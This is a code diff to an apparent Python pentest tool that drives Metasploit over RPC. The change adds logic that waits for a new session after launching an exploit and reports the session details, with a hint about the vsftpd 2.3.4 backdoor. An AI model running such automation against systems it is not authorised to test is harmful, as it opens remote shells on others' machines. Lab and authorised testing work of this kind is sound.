@@ -5,6 +5,7 @@ import ipaddress
 import re
 from pymetasploit3.msfrpc import MsfRpcClient
 from dotenv import load_dotenv
+import time
 
 def get_network_ips():
     for iface in netifaces.interfaces():
@@ -113,6 +114,9 @@ class Exploiter:
             Dictionary with execution results and session info
         """
         try:
+            # Get current sessions before exploit
+            sessions_before = set(self.get_sessions().keys())
+            
             # Load the exploit module
             exploit = self.client.modules.use('exploit', exploit_name)
             
@@ -142,21 +146,43 @@ class Exploiter:
             # Execute the exploit
             result = exploit.execute(payload=payload)
             
-            # Check if a session was created
-            sessions = self.get_sessions()
+            # Wait for session to establish (exploits are async)
             session_id = None
-            if sessions:
-                # Get the most recent session (highest ID)
-                session_id = max(sessions.keys())
+            max_wait = 10  # Wait up to 10 seconds
+            wait_interval = 0.5  # Check every 0.5 seconds
             
-            return {
-                'success': True,
-                'exploit': exploit_name,
-                'target': target_ip,
-                'result': result,
-                'session_id': session_id,
-                'message': f'Exploit executed successfully. Session ID: {session_id}' if session_id else 'Exploit executed, but no session created.'
-            }
+            for i in range(int(max_wait / wait_interval)):
+                time.sleep(wait_interval)
+                sessions_after = set(self.get_sessions().keys())
+                new_sessions = sessions_after - sessions_before
+                
+                if new_sessions:
+                    # New session(s) created
+                    session_id = max(new_sessions)  # Get the newest session
+                    break
+            
+            if session_id:
+                # Get session details
+                sessions = self.get_sessions()
+                session_info = sessions.get(session_id, {})
+                return {
+                    'success': True,
+                    'exploit': exploit_name,
+                    'target': target_ip,
+                    'result': result,
+                    'session_id': session_id,
+                    'session_info': session_info,
+                    'message': f'Exploit successful! Session {session_id} created on {target_ip}'
+                }
+            else:
+                return {
+                    'success': True,
+                    'exploit': exploit_name,
+                    'target': target_ip,
+                    'result': result,
+                    'session_id': None,
+                    'message': f'Exploit launched (job_id: {result.get("job_id", "N/A")}), but no session created after {max_wait}s. Target may not be vulnerable or network issues exist. Check: 1) Target runs vsftpd 2.3.4 with backdoor, 2) Port 21 is open, 3) No firewall blocking.'
+                }
         
         except Exception as e:
             return {
